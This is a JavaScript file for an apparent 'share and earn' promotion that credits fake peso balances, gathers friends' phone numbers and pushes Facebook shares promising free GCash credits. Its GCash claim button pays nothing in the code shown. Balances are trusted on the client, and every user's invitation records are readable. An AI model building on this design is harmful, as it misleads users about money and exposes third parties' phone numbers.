// ========== PROMOTION.JS - SHARE AND EARN ==========
// Complete with Firebase, Real-time Invitations, and Claim Logic

// ========== LOCALSTORAGE KEYS ==========
function getUserStorageKeys() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return null;
    return {
        phone: phone,
        balanceKey: "userBalance_" + phone,
        leftRewardKey: "leftReward_" + phone,
        invitesKey: "invitations_" + phone,
        invitesCountKey: "invitesCount_" + phone
    };
}

// ========== UTILITY FUNCTIONS ==========
function formatPhoneWithAsterisk(phone) {
    if (!phone || phone.length !== 11) return phone;
    var first4 = phone.substring(0, 4);
    var last4 = phone.substring(7, 11);
    return first4 + '***' + last4;
}

// ========== BALANCE FUNCTIONS ==========
async function saveBalance(amount) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    
    localStorage.setItem(keys.balanceKey, amount);
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        await db.ref('user_sessions/' + keys.phone).update({
            balance: amount,
            lastUpdate: Date.now()
        });
    }
}

async function getBalance() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    
    var balance = localStorage.getItem(keys.balanceKey);
    if (balance) return parseInt(balance);
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var snap = await db.ref('user_sessions/' + keys.phone).once('value');
        if (snap.exists() && snap.val().balance) {
            var fbBalance = snap.val().balance;
            localStorage.setItem(keys.balanceKey, fbBalance);
            return fbBalance;
        }
    }
    return 0;
}

async function addBalance(amount) {
    var currentBalance = await getBalance();
    var newBalance = currentBalance + amount;
    
    if (newBalance > 1200) {
        alert("Maximum balance of ₱1200 reached!");
        return currentBalance;
    }
    
    await saveBalance(newBalance);
    return newBalance;
}

function displayBalance() {
    getBalance().then(function(balance) {
        var balanceSpan = document.getElementById('userBalanceDisplay');
        if (balanceSpan) balanceSpan.innerHTML = '₱' + balance;
    });
}

// ========== LEFT REWARD STATUS ==========
async function saveLeftRewardClaimed(claimed) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    
    localStorage.setItem(keys.leftRewardKey, claimed ? 'true' : 'false');
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        await db.ref('user_sessions/' + keys.phone).update({
            leftRewardClaimed: claimed,
            leftRewardAmount: claimed ? 150 : 0,
            leftRewardClaimedAt: claimed ? Date.now() : null
        });
    }
}

async function getLeftRewardClaimed() {
    var keys = getUserStorageKeys();
    if (!keys) return false;
    
    var claimed = localStorage.getItem(keys.leftRewardKey);
    if (claimed) return claimed === 'true';
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var snap = await db.ref('user_sessions/' + keys.phone).once('value');
        if (snap.exists() && snap.val().leftRewardClaimed) {
            localStorage.setItem(keys.leftRewardKey, 'true');
            return true;
        }
    }
    return false;
}

// ========== INVITATION FUNCTIONS ==========
async function addInvitation(friendPhone) {
    var keys = getUserStorageKeys();
    if (!keys) return false;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        
        // Check if already invited
        var existing = await db.ref('invitations/' + keys.phone + '/' + friendPhone).once('value');
        if (existing.exists()) return false;
        
        await db.ref('invitations/' + keys.phone + '/' + friendPhone).set({
            invitedBy: keys.phone,
            invitedPhone: friendPhone,
            timestamp: Date.now(),
            status: 'pending'
        });
        
        // Update local count
        var invites = getInvitations();
        invites.push({ phone: friendPhone, status: 'pending', timestamp: Date.now() });
        saveInvitations(invites);
        
        return true;
    }
    return false;
}

function getInvitations() {
    var keys = getUserStorageKeys();
    if (!keys) return [];
    var invites = localStorage.getItem(keys.invitesKey);
    return invites ? JSON.parse(invites) : [];
}

function saveInvitations(invitations) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.invitesKey, JSON.stringify(invitations));
    localStorage.setItem(keys.invitesCountKey, invitations.length);
}

function getInvitesCount() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var count = localStorage.getItem(keys.invitesCountKey);
    return count ? parseInt(count) : 0;
}

function displayInvitesCount() {
    var count = getInvitesCount();
    var invitesSpan = document.getElementById('invitesCountDisplay');
    if (invitesSpan) invitesSpan.innerHTML = count + ' / 6';
    return count;
}

// ========== LOAD INVITATIONS FROM FIREBASE ==========
async function loadSentInvitations() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return [];
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var snapshot = await db.ref('invitations/' + phone).once('value');
        var invites = [];
        
        if (snapshot.exists()) {
            var data = snapshot.val();
            for (var friendPhone in data) {
                invites.push({
                    phone: friendPhone,
                    status: data[friendPhone].status,
                    timestamp: data[friendPhone].timestamp,
                    acceptedAt: data[friendPhone].acceptedAt || null
                });
            }
        }
        return invites;
    }
    return [];
}

async function loadReceivedInvitations() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return [];
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var invitesRef = db.ref('invitations');
        var snapshot = await invitesRef.once('value');
        var received = [];
        
        if (snapshot.exists()) {
            var data = snapshot.val();
            for (var inviter in data) {
                if (data[inviter][phone]) {
                    received.push({
                        from: inviter,
                        status: data[inviter][phone].status,
                        timestamp: data[inviter][phone].timestamp,
                        acceptedAt: data[inviter][phone].acceptedAt || null
                    });
                }
            }
        }
        return received;
    }
    return [];
}

// ========== RENDER INVITATIONS ==========
function renderInvitationsFromStorage() {
    var invitations = getInvitations();
    var listBody = document.getElementById('inviteListBody');
    if (!listBody) return;
    
    if (invitations.length === 0) {
        listBody.innerHTML = '<div class="invite-empty">No invitations sent</div>';
        return;
    }
    
    var html = '';
    for (var i = 0; i < invitations.length; i++) {
        var inv = invitations[i];
        var formattedPhone = formatPhoneWithAsterisk(inv.phone);
        var statusClass = inv.status === 'approved' ? 'approved' : 'pending';
        var statusText = inv.status === 'approved' ? 'APPROVED' : 'PENDING';
        var disabled = inv.status === 'approved' ? 'disabled' : '';
        
        html += '<div class="invite-item">';
        html += '<div class="invite-item-phone">' + formattedPhone + '</div>';
        html += '<div class="invite-item-status"><span class="status-badge ' + statusClass + '">' + statusText + '</span></div>';
        html += '<div class="invite-item-action">';
        html += '<button class="delete-invite" onclick="deleteInviteFromStorage(\'' + inv.phone + '\')" ' + disabled + '>✕</button>';
        html += '</div>';
        html += '</div>';
    }
    listBody.innerHTML = html;
}

async function renderSentInvitations() {
    var sentList = document.getElementById('sentInvitesList');
    if (!sentList) return;
    
    var invites = await loadSentInvitations();
    
    if (invites.length === 0) {
        sentList.innerHTML = '<div class="invite-empty">No invitations sent</div>';
        return;
    }
    
    var html = '';
    for (var i = 0; i < invites.length; i++) {
        var inv = invites[i];
        var formattedPhone = formatPhoneWithAsterisk(inv.phone);
        var statusClass = inv.status === 'approved' ? 'approved' : 'pending';
        var statusText = inv.status === 'approved' ? 'APPROVED' : 'PENDING';
        var disabled = inv.status === 'approved' ? 'disabled' : '';
        
        html += '<div class="invite-item">';
        html += '<div class="invite-phone">' + formattedPhone + '</div>';
        html += '<div><span class="invite-status ' + statusClass + '">' + statusText + '</span></div>';
        html += '<div><button class="invite-delete" onclick="deleteSentInvitation(\'' + inv.phone + '\')" ' + disabled + '>✕</button></div>';
        html += '</div>';
    }
    sentList.innerHTML = html;
}

async function renderReceivedInvitations() {
    var receivedList = document.getElementById('receivedInvitesList');
    if (!receivedList) return;
    
    var received = await loadReceivedInvitations();
    
    if (received.length === 0) {
        receivedList.innerHTML = '<div class="invite-empty">No invitations received</div>';
        return;
    }
    
    var html = '';
    for (var i = 0; i < received.length; i++) {
        var inv = received[i];
        var formattedFrom = formatPhoneWithAsterisk(inv.from);
        var statusClass = inv.status === 'approved' ? 'approved' : 'pending';
        var statusText = inv.status === 'approved' ? 'CLAIMED' : 'PENDING';
        var reward = inv.status === 'approved' ? '+₱150' : '-';
        
        html += '<div class="invite-item">';
        html += '<div class="invite-phone">' + formattedFrom + '</div>';
        html += '<div><span class="invite-status ' + statusClass + '">' + statusText + '</span></div>';
        html += '<div class="invite-reward">' + reward + '</div>';
        html += '</div>';
    }
    receivedList.innerHTML = html;
}

// ========== DELETE FUNCTIONS ==========
window.deleteInviteFromStorage = function(friendPhone) {
    var invitations = getInvitations();
    var invite = null;
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone === friendPhone) { invite = invitations[i]; break; }
    }
    if (invite && invite.status === 'approved') {
        alert("Cannot delete approved invitation!");
        return;
    }
    if (confirm("Delete invitation?")) {
        deleteInvitationByPhone(friendPhone);
        renderInvitationsFromStorage();
        displayInvitesCount();
    }
};

window.deleteSentInvitation = async function(friendPhone) {
    var userPhone = localStorage.getItem("userPhone");
    if (!userPhone) return;
    
    if (confirm("Delete invitation to " + formatPhoneWithAsterisk(friendPhone) + "?")) {
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            await db.ref('invitations/' + userPhone + '/' + friendPhone).remove();
            await renderSentInvitations();
            alert("Invitation deleted.");
        }
    }
};

function deleteInvitationByPhone(friendPhone) {
    var invitations = getInvitations();
    var newInvites = [];
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone !== friendPhone) newInvites.push(invitations[i]);
    }
    saveInvitations(newInvites);
}

// ========== SEND INVITATION ==========
window.sendInviteToStorage = async function() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Enter valid 11-digit number starting with 09");
        return;
    }
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    if (getInvitesCount() >= 6) {
        alert("Maximum 6 invites only!");
        return;
    }
    if (await addInvitation(friendPhone)) {
        document.getElementById('friendPhoneInput').value = '';
        await renderSentInvitations();
        displayInvitesCount();
        alert("Invitation sent!");
    } else {
        alert("You already invited this person!");
    }
};

// ========== REAL-TIME LISTENER ==========
function setupRealtimeInvitations() {
    var userPhone = localStorage.getItem("userPhone");
    if (!userPhone) return;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        
        db.ref('invitations/' + userPhone).on('value', function() {
            renderSentInvitations();
        });
        
        db.ref('invitations').on('value', function() {
            renderReceivedInvitations();
            checkPendingInvites();
        });
    }
}

// ========== ACCEPT INVITATION ==========
async function acceptInvitation(inviterPhone) {
    var currentUserPhone = localStorage.getItem("userPhone");
    if (!currentUserPhone) return false;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        
        await db.ref('invitations/' + inviterPhone + '/' + currentUserPhone).update({
            status: 'approved',
            acceptedAt: Date.now()
        });
        
        var inviterRef = db.ref('user_sessions/' + inviterPhone);
        var inviterSnap = await inviterRef.once('value');
        var currentAccepted = inviterSnap.exists() ? inviterSnap.val().acceptedInvites || 0 : 0;
        var newAccepted = currentAccepted + 1;
        
        await inviterRef.update({
            acceptedInvites: newAccepted,
            rightRewardAvailable: newAccepted * 150,
            lastUpdate: Date.now()
        });
        
        if (inviterPhone === currentUserPhone) {
            updateRightRewardAmount(newAccepted * 150);
        }
        return true;
    }
    return false;
}

async function checkPendingInvites() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var invitesRef = db.ref('invitations');
        var snapshot = await invitesRef.once('value');
        
        if (snapshot.exists()) {
            var invites = snapshot.val();
            for (var inviter in invites) {
                if (invites[inviter][phone] && invites[inviter][phone].status === 'pending') {
                    await acceptInvitation(inviter);
                    console.log("Auto-accepted invitation from:", inviter);
                    activateRightLuckyCatForUser(phone);
                }
            }
        }
    }
}

async function activateRightLuckyCatForUser(userPhone) {
    if (userPhone !== localStorage.getItem("userPhone")) return;
    
    var rightCard = document.getElementById('rightCard');
    if (!rightCard) return;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var snap = await db.ref('user_sessions/' + userPhone).once('value');
        var rightAvailable = snap.exists() ? snap.val().rightRewardAvailable || 0 : 0;
        
        if (rightAvailable > 0) {
            updateRightRewardAmount(rightAvailable);
            rightCard.classList.add('prize-card-pulse');
            rightCard.style.cursor = 'pointer';
        }
    }
}

function updateRightRewardAmount(amount) {
    var rightAmountSpan = document.getElementById('rightRewardAmount');
    if (rightAmountSpan) {
        rightAmountSpan.innerHTML = '₱' + amount;
    }
}

// ========== UPDATE LEFT CARD VISUAL ==========
function updateLeftCardFromStorage() {
    getLeftRewardClaimed().then(function(claimed) {
        var leftCard = document.getElementById('leftCard');
        if (!leftCard) return;
        if (claimed) {
            leftCard.classList.add('prize-card-claimed');
            leftCard.classList.remove('prize-card-glow');
            leftCard.style.cursor = 'default';
        } else {
            leftCard.classList.add('prize-card-glow');
            leftCard.classList.remove('prize-card-claimed');
            leftCard.style.cursor = 'pointer';
        }
    });
}

// ========== CONFETTI ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    stopConfetti();
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    var particles = [];
    for (var i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 6 + 2,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 3 + 2
        });
    }
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        confettiAnimation = requestAnimationFrame(draw);
    }
    draw();
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(stopConfetti, 3000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== FLOATING ANIMATION ==========
function showFloatingPlus(x, y, amount) {
    var floatingDiv = document.createElement('div');
    floatingDiv.className = 'floating-plus';
    floatingDiv.innerHTML = '+₱' + amount;
    floatingDiv.style.position = 'fixed';
    floatingDiv.style.left = x + 'px';
    floatingDiv.style.top = y + 'px';
    floatingDiv.style.color = '#ffd700';
    floatingDiv.style.fontSize = '36px';
    floatingDiv.style.fontWeight = 'bold';
    floatingDiv.style.fontFamily = 'Orbitron, monospace';
    floatingDiv.style.textShadow = '0 0 15px #ffaa33';
    floatingDiv.style.pointerEvents = 'none';
    floatingDiv.style.zIndex = '10001';
    floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
    document.body.appendChild(floatingDiv);
    setTimeout(function() { floatingDiv.remove(); }, 1000);
}

// ========== LEFT LUCKY CAT ==========
function initLeftLuckyCard() {
    var leftCard = document.getElementById('leftCard');
    if (!leftCard) return;
    
    var luckySound = new Audio('sounds/luckycat.mp4');
    luckySound.loop = false;
    luckySound.volume = 0.7;
    
    getLeftRewardClaimed().then(function(claimed) {
        if (claimed) {
            leftCard.classList.add('prize-card-claimed');
            leftCard.classList.remove('prize-card-glow');
            leftCard.style.cursor = 'default';
        } else {
            leftCard.classList.add('prize-card-glow');
            leftCard.style.cursor = 'pointer';
            
            leftCard.addEventListener('click', async function(e) {
                e.stopPropagation();
                
                var isClaimed = await getLeftRewardClaimed();
                if (isClaimed) {
                    alert("You already claimed your ₱150!");
                    return;
                }
                
                luckySound.currentTime = 0;
                luckySound.play().catch(function(err) { console.log("Audio error:", err); });
                
                var rect = this.getBoundingClientRect();
                var x = rect.left + rect.width / 2;
                var y = rect.top + rect.height / 2;
                
                var newBalance = await addBalance(150);
                await saveLeftRewardClaimed(true);
                
                this.classList.remove('prize-card-glow');
                this.classList.add('prize-card-claimed');
                this.style.cursor = 'default';
                
                showFloatingPlus(x, y, 150);
                startConfetti();
                displayBalance();
                
                var statusMsg = document.getElementById('statusMessage');
                if (statusMsg) {
                    statusMsg.innerHTML = '<span class="status-locked">🐱 <strong style="color:#ffd700;">+₱150 CLAIMED!</strong> Your balance: <strong style="color:#ffd700;">₱' + newBalance + '</strong> ✨</span>';
                    setTimeout(function() {
                        statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
                    }, 3000);
                }
            });
        }
    });
}

// ========== RIGHT LUCKY CAT ==========
function initRightLuckyCat() {
    var rightCard = document.getElementById('rightCard');
    if (!rightCard) return;
    
    rightCard.addEventListener('click', async function(e) {
        e.stopPropagation();
        
        var phone = localStorage.getItem("userPhone");
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            var snap = await db.ref('user_sessions/' + phone).once('value');
            var rightAvailable = snap.exists() ? snap.val().rightRewardAvailable || 0 : 0;
            var rightClaimed = snap.exists() ? snap.val().rightRewardClaimed || 0 : 0;
            var availableNow = rightAvailable - rightClaimed;
            
            if (availableNow <= 0) {
                alert("No rewards available! Invite friends to earn ₱150 each.");
                return;
            }
            
            var currentBalance = await getBalance();
            if (currentBalance >= 1200) {
                alert("Maximum balance of ₱1200 reached!");
                return;
            }
            
            var rect = this.getBoundingClientRect();
            var x = rect.left + rect.width / 2;
            var y = rect.top + rect.height / 2;
            
            var newClaimed = rightClaimed + 150;
            await db.ref('user_sessions/' + phone).update({
                rightRewardClaimed: newClaimed,
                lastClaimAt: Date.now()
            });
            
            var newBalance = await addBalance(150);
            
            showFloatingPlus(x, y, 150);
            startConfetti();
            displayBalance();
            
            var remaining = rightAvailable - newClaimed;
            updateRightRewardAmount(remaining);
            
            if (remaining <= 0) {
                this.classList.remove('prize-card-pulse');
                this.classList.add('prize-card-claimed');
                this.style.cursor = 'default';
            }
            
            var statusMsg = document.getElementById('statusMessage');
            if (statusMsg) {
                statusMsg.innerHTML = '<span class="status-locked">🐱 <strong style="color:#ffd700;">+₱150 CLAIMED!</strong> Your balance: <strong style="color:#ffd700;">₱' + newBalance + '</strong> ✨</span>';
                setTimeout(function() {
                    statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
                }, 3000);
            }
        }
    });
}

// ========== CLAIM NOW BUTTON ==========
function initClaimNowButton() {
    var claimNowBtn = document.getElementById('claimNowBtn');
    if (claimNowBtn) {
        var newBtn = claimNowBtn.cloneNode(true);
        claimNowBtn.parentNode.replaceChild(newBtn, claimNowBtn);
        claimNowBtn = newBtn;

        claimNowBtn.innerHTML = '';
        
        var icon = document.createElement('img');
        icon.src = 'images/scatter_icon.jpg';
        icon.className = 'claim-icon';
        icon.style.width = '24px';
        icon.style.height = '24px';
        icon.style.marginRight = '8px';
        icon.style.transition = 'transform 0.3s ease';
        
        claimNowBtn.appendChild(icon);
        claimNowBtn.appendChild(document.createTextNode(' CLAIM NOW!!'));
        
        claimNowBtn.onclick = function(e) {
            e.preventDefault();
            icon.style.transform = 'rotate(360deg)';
            setTimeout(function() {
                icon.style.transform = '';
                showPrizePopup();
            }, 300);
        };
    }
}

// ========== POPUP FUNCTIONS ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'flex';
        startConfetti();
    }
}

function closePrizePopup() {
    window.location.reload();
}

// ========== FACEBOOK SHARE ==========
function initFacebookShare() {
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.innerHTML = '';
        
        var fbIcon = document.createElement('img');
        fbIcon.src = 'images/fb_icon.png';
        fbIcon.style.width = '20px';
        fbIcon.style.height = '20px';
        fbIcon.style.marginRight = '8px';
        
        fbBtn.appendChild(fbIcon);
        fbBtn.appendChild(document.createTextNode(' Share on Facebook'));
        
        fbBtn.onclick = function() {
            var userPhone = localStorage.getItem("userPhone");
            var formattedPhone = userPhone ? userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11) : 'User';
            var caption = "🎉 FREE +₱300 GCASH CREDITS! 🎉\n\nUse my referral code: " + formattedPhone + "\n\n#LuckyDrop #Rewards #GCash";
            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(caption), '_blank', 'width=600,height=500');
        };
    }
}

// ========== CLAIM THRU GCASH BUTTON ==========
function initClaimButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (!claimBtn) return;
    
    var newBtn = claimBtn.cloneNode(true);
    claimBtn.parentNode.replaceChild(newBtn, claimBtn);
    claimBtn = newBtn;
    
    claimBtn.innerHTML = '';
    
    var gcIcon = document.createElement('img');
    gcIcon.src = 'images/gc_icon.png';
    gcIcon.style.width = '20px';
    gcIcon.style.height = '20px';
    gcIcon.style.marginRight = '8px';
    
    claimBtn.appendChild(gcIcon);
    claimBtn.appendChild(document.createTextNode(' CLAIM THRU GCASH'));
    
    claimBtn.onclick = async function() {
        alert("Please click the CLAIM NOW button first to see your reward.");
    };
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loading...");
    
    var userPhone = localStorage.getItem("userPhone");
    if (!userPhone) {
        alert("Please login first.");
        window.location.href = "index.html";
        return;
    }
    
    var display = document.getElementById('userPhoneDisplay');
    if (display) {
        display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
    }
    
    displayBalance();
    displayInvitesCount();
    updateLeftCardFromStorage();
    renderInvitationsFromStorage();
    
    // Real-time invitations
    renderSentInvitations();
    renderReceivedInvitations();
    setupRealtimeInvitations();
    checkPendingInvites();
    
    initLeftLuckyCard();
    initRightLuckyCat();
    initClaimNowButton();
    initClaimButton();
    initFacebookShare();
    
    var sendBtn = document.getElementById('sendInviteBtn');
    if (sendBtn) {
        var newSendBtn = sendBtn.cloneNode(true);
        sendBtn.parentNode.replaceChild(newSendBtn, sendBtn);
        newSendBtn.onclick = window.sendInviteToStorage;
    }
    
    console.log("Promotion.js ready");
});
